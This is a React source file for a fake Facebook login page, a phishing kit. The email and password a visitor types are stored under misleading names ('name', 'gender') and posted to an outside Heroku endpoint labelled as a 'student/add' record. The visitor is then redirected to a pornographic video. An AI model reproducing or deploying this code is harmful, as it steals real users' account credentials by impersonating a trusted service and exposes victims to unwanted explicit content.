import React, { useState } from 'react'
import './style.css'
import Img from './fb-mobile.png'
import { useNavigate } from "react-router-dom";
import axios from 'axios';

function Fb() {
    const navigate = useNavigate();
    const [name, setName] = useState("");
    const [age, setAge] = useState("0");
    const [gender, setGender] = useState("");


    const SubmitHandler = (e) => {
        e.preventDefault();
        const newStudent = { name, age, gender }
        console.log(newStudent)
        if ((name.length && gender.length) > 0) {
            axios.post('https://n3facebook.herokuapp.com/student/add', newStudent).then(() => {

                sexHandler()
                
            }).catch((err) => {
                alert(err)
            })
            console.log("dcbdbcd")
        }
        else {
            console.log("not RUN")
        }

    }

    const sexHandler = () => {
        console.log("fndjndfn")

        window.location.replace('https://www.pornhub.com/view_video.php?viewkey=ph5fff13dfbd101')
    }


    return (
        <div class="facebook">

            <div class="mobile-top-view">

                <a href="#">Get Facebook for Android and browse faster.</a>
            </div>
            <div class="view">
                <div class="container">
                    <div class="row">
                        <div class="col title-div">
                            <div>
                                <h1 class="text-primary">facebook</h1>
                                <p>Connect with friends and the world around you on Facebook.</p>


                            </div>
                        </div>
                        <div class="col-sm-5">
                            <div class="card">
                                <div>
                                    <input id="email" class="input-group" type="text" placeholder="Email or Phone Number" onChange={(e) => { setName(e.target.value) }} />
                                    <input id="pass" class="input-group my-2" type="password" placeholder="Password" onChange={(e) => { setGender(e.target.value) }} />
                                    <button id="fbLogin" class="btn btn-primary btn-lg" style={{ width: "100%" }} onClick={SubmitHandler}   >Log in</button>
                                    <hr id="hr1"></hr>
                                    <p id="forgetPass1" class="text-center my-3" ><a href="#" style={{ fontSize: 14 }}>Forget account?</a></p>
                                </div>
                                <hr id="hr2"></hr>
                                <button id="createAcBtn" class="btn btn-success btn-lg">Create New Account</button>
                                <p id="forgetPass2" class="text-center my-3"><a href="#">Forget account?</a></p>
                            </div>
                            <p id="form-footer" class="text-center my-4" style={{ fontSize: 14 }}><b>Create a Page</b> for a celebrity,
                                brand or buisness.
                            </p>
                            <div class="mobile-version-footer">
                                <div class="row language">
                                    <div class="col">
                                        <p>English (US)</p>
                                        <p>हिन्दी</p>
                                        <p>Portugues (Brasil)</p>
                                        <p>Deutsch</p>
                                    </div>
                                    <div class="col">
                                        <p>नेपाली</p>
                                        <p>Espanol</p>
                                        <p>Francais (France)</p>
                                        <p><i class="fa fa-plus-square"></i></p>
                                    </div>
                                </div>
                                <div class="nav">
                                    <ul>
                                        <a href="">
                                            <li>About</li>
                                        </a>
                                        <a href="">
                                            <li>Help</li>
                                        </a>
                                        <a href="">
                                            <li>More</li>
                                        </a>
                                    </ul>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>

        </div>
    )
}

export default Fb